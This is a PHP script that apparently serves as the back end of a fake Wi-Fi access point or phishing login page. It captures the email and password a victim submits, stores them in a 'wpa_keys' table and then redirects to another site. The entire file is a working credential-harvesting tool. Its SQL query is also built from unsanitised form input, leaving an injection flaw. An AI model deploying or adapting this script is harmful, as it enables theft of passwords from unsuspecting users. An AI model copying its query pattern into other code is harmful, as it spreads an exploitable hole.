<?php
session_start();
ob_start();
$host="localhost";
$username="fapuser";
$pass="fappassword";
$dbname="fap";
$tbl_name="wpa_keys";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if ($conn) {
    $email=$_POST['email'];
	$password=$_POST['pass'];

	$sql = "INSERT INTO wpa_keys (username, password2) VALUES ('$email', '$password')";
	if (mysqli_query($conn, $sql)) {
        	echo "New record created successfully";
	} else {
    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}

	mysqli_close($conn);
}

sleep(2);
header("Location: https://hackedscreen.com/");
ob_end_flush();
?>
